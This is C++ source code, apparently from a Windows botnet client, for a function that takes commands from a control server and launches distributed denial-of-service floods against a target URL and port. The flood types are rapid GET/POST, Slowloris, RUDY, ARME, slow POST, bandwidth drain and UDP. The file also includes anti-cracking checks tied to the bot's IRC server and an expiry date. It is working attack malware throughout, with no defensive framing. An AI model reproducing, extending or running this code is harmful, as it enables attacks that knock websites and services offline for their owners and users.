#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
bool HandleDdosCommand(char *cCommand, char *cTargetUrl, unsigned short usTargetPort, unsigned int uiFloodLength)
{
#ifdef HTTP_BUILD
    int nLocalTaskId = nCurrentTaskId;
#endif

    unsigned short usCommandType;
    unsigned short usThreadCount;

    bool bReturn = FALSE;

    if(strstr(cCommand, "http."))
    {
        if(strstr(cCommand, "rapidget"))
        {
            usThreadCount = THREADS_DDOS_HTTP_RAPID_GET;
            usCommandType = DDOS_HTTP_RAPID_GET;
        }
        else if(strstr(cCommand, "rapidpost"))
        {
            usThreadCount = THREADS_DDOS_HTTP_RAPID_POST;
            usCommandType = DDOS_HTTP_RAPID_POST;
        }
        else if(strstr(cCommand, "slowpost"))
        {
            usThreadCount = THREADS_DDOS_HTTP_SLOW_POST;
            usCommandType = DDOS_HTTP_SLOW_POST;
        }
        else if(strstr(cCommand, "slowloris"))
        {
            usThreadCount = THREADS_DDOS_HTTP_SLOWLORIS;
            usCommandType = DDOS_HTTP_SLOWLORIS;
        }
        else if(strstr(cCommand, "rudy"))
        {
            usThreadCount = THREADS_DDOS_HTTP_RUDY;
            usCommandType = DDOS_HTTP_RUDY;
        }
        else if(strstr(cCommand, "arme"))
        {
            usThreadCount = THREADS_DDOS_HTTP_ARME;
            usCommandType = DDOS_HTTP_ARME;
        }
        else if(strstr(cCommand, "bandwith"))
        {
            usThreadCount = THREADS_DDOS_HTTP_BANDWITH;
            usCommandType = DDOS_HTTP_BANDWITH;
        }
        else if(strstr(cCommand, "combo"))
        {
            usThreadCount = THREADS_DDOS_HTTP_COMBO;
            usCommandType = DDOS_HTTP_COMBO;
        }
        else
            bReturn = FALSE;
    }
    else if(strstr(cCommand, "layer4."))
    {
        if(strstr(cCommand, "udp"))
        {
            usThreadCount = THREADS_DDOS_LAYER4_UDP;
            usCommandType = DDOS_LAYER4_UDP;
        }
        else if(strstr(cCommand, "ecf"))
        {
            usThreadCount = THREADS_DDOS_LAYER4_ECF;
            usCommandType = DDOS_LAYER4_ECF;
        }
        else
            return FALSE;
    }
    else
        bReturn = FALSE;

    if(usCommandType != DDOS_HTTP_BANDWITH)
    {
        usFloodType = usCommandType;
        usFloodPort = usTargetPort;

        char cBreakUrl[strlen(cTargetUrl)];
        strcpy(cBreakUrl, cTargetUrl);

        char *pcBreakUrl = cBreakUrl;

        if(strstr(pcBreakUrl, "http://"))
        pcBreakUrl += 7;
        else if(strstr(pcBreakUrl, "https://"))
            pcBreakUrl += 8;

        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
        char *cStr = cCheckString;
        unsigned long ulCheck = (360527*3)/(199+2);
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum7)
            pcBreakUrl += 5;
        // <!-------! CRC AREA STOP !-------!>

        pcBreakUrl = strtok(pcBreakUrl, "/");
        if(pcBreakUrl != NULL)
            strcpy(cFloodHost, pcBreakUrl);

        pcBreakUrl = strtok(NULL, "?");
        if(pcBreakUrl != NULL)
            strcpy(cFloodPath, pcBreakUrl);

        pcBreakUrl = strtok(NULL, "?");
        if(pcBreakUrl != NULL)
            strcpy(cFloodData, pcBreakUrl);
    }
    else
        strcpy(cFloodHost, cTargetUrl);

    unsigned short usThreadSuccesses = 0;
    HANDLE *hThreads = new HANDLE[usThreadCount];
    for(unsigned short us = 0; us < usThreadCount; us++)
    {
        if(usCommandType == DDOS_HTTP_RAPID_GET || usCommandType == DDOS_HTTP_RAPID_POST || usCommandType == DDOS_HTTP_ARME)
            hThreads[us] = CreateThread(NULL, NULL, DdosGetPostArme, NULL, NULL, NULL);
        else if(usCommandType == DDOS_HTTP_SLOW_POST)
            hThreads[us] = CreateThread(NULL, NULL, DdosSlowPost, NULL, NULL, NULL);
        else if((usCommandType == DDOS_HTTP_SLOWLORIS) || (usCommandType == DDOS_HTTP_RUDY))
            hThreads[us] = CreateThread(NULL, NULL, DdosSlowlorisRudy, NULL, NULL, NULL);
        else if(usCommandType == DDOS_LAYER4_UDP)
            hThreads[us] = CreateThread(NULL, NULL, DdosUdp, NULL, NULL, NULL);
        else if(usCommandType == DDOS_LAYER4_ECF)
            hThreads[us] = CreateThread(NULL, NULL, DdosCondis, NULL, NULL, NULL);
        else if(usCommandType == DDOS_HTTP_BANDWITH)
            hThreads[us] = CreateThread(NULL, NULL, BandwithDrain, NULL, NULL, NULL);
        else if(usCommandType == DDOS_HTTP_COMBO)
        {
            if(us % 3 == 0)
                hThreads[us] = CreateThread(NULL, NULL, DdosGetPostArme, NULL, NULL, NULL);
            else if(us % 3 == 1)
                hThreads[us] = CreateThread(NULL, NULL, DdosSlowPost, NULL, NULL, NULL);
            else if(us % 3 == 2)
                hThreads[us] = CreateThread(NULL, NULL, DdosSlowlorisRudy, NULL, NULL, NULL);
        }
        else
        {
#ifndef HTTP_BUILD
            SendInvalidParameters();
#endif
            bReturn = FALSE;
            break;
        }

        if(hThreads[us] != NULL)
            usThreadSuccesses++;

        CloseHandle(hThreads[us]);

        Sleep(1);
    }

    if(usThreadSuccesses > 0)
    {
        bReturn = TRUE;
        dwStoreParameter = uiFloodLength;

        if((usCommandType == DDOS_LAYER4_ECF) || (usCommandType == DDOS_LAYER4_UDP))
            bStoreParameter == FALSE;
        else
            bStoreParameter = TRUE;

        bDdosBusy = TRUE;

        if((usCommandType == DDOS_HTTP_RAPID_GET) || (usCommandType == DDOS_HTTP_RAPID_POST) || (usCommandType == DDOS_HTTP_ARME) || (usCommandType == DDOS_LAYER4_UDP))
            bStoreParameter2 = TRUE;
        else
            bStoreParameter2 = FALSE;

        StartNonBlockingDdosTimer();
    }
    else
        bReturn = FALSE;

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
    {
        bDdosBusy = FALSE;
        bReturn = FALSE;
    }
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

#ifdef HTTP_BUILD
    for(unsigned short us = 0; us < 6; us++)
    {
        if(SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
            break;

        Sleep(10000);
    }
#endif

    return bReturn;
}
#endif
